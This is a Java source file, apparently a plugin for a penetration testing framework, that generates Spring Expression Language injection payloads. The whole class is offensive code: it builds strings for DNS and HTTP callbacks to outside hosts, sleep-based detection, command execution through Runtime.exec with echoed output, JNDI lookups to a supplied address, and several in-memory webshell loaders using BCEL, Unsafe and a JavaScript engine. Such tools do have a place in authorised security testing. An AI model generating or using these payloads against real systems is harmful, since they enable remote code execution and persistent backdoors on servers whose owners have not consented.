package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;
import me.gv7.woodpecker.plugin.utils.MemShellClassFactory;
import me.gv7.woodpecker.plugin.utils.MemShellJSUtils;
import me.gv7.woodpecker.plugin.utils.SpELMemShellFactory;
import me.gv7.woodpecker.plugin.utils.Utils;

public class SpELExpr implements IExpr {
    private String _encoder = "none";

    @Override
    public void setEncoder(String encoder) {
        _encoder = encoder;
    }

    private String out(String text) {
        return Utils.encoder(text, _encoder);
    }

    @Override
    public String getName() {
        return "SpEL";
    }

    @Override
    public String[] genDnslog(String domain) {
        return new String[]{
                out("#{T(java.net.InetAddress).getByName('" + domain.replace("'", "''") + "')}")
        };
    }

    @Override
    public String[] genHttplog(String url) {
        return new String[]{
                out("#{T(org.springframework.web.client.RestTemplate).newInstance().headForHeaders('" + url.replace("'", "''") + "')}"),
                out("#{new java.net.URL('" + url.replace("'", "''") + "').getContent()}")
        };
    }

    @Override
    public String[] genSleep(int sec) {
        return new String[]{
                out("#{T(java.lang.Thread).sleep(" + (sec * 1000) + ")}")
        };
    }

    @Override
    public String[] genExec(String command) {
        return new String[]{
                out("#{T(java.lang.Runtime).getRuntime().exec('" + command.replace("'", "''") + "')}")
        };
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[]{
                out("#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('" + command.replace("'", "''") + "').getInputStream()).useDelimiter('\\A').next()}")
        };
    }

    @Override
    public String[] genMemShell(byte[] memShellClass) {
        try {
            return new String[]{
                    "[+] Spring反射组件方案：==>" + System.lineSeparator() + out(SpELMemShellFactory.genSpringMemShell1(memShellClass)) + System.lineSeparator() + " <==",
                    "[+] BCEL方案：==>" + System.lineSeparator() + out(SpELMemShellFactory.genSpringMemShell2(memShellClass)) + System.lineSeparator() + " <==",
                    "[+] JS-Unsafe方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.UNSAFE).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
                    "[+] JS-BASE64方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
                    "[+] JS-BCEL方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER).replace("'", "''") + "')}") + System.lineSeparator() + " <=="
            };
        } catch (Exception ex) {
            return new String[]{
                    "class文件异常",
                    Utils.getErrDetail(ex)
            };
        }
    }

    @Override
    public String[] genJNDI(String jndiAddress) {
        return new String[]{out("#{new javax.naming.InitialContext().lookup('" + jndiAddress + "')}")};
    }

    @Override
    public String[] genLoadJar(String url, String className) {
        return new String[0];
    }

}
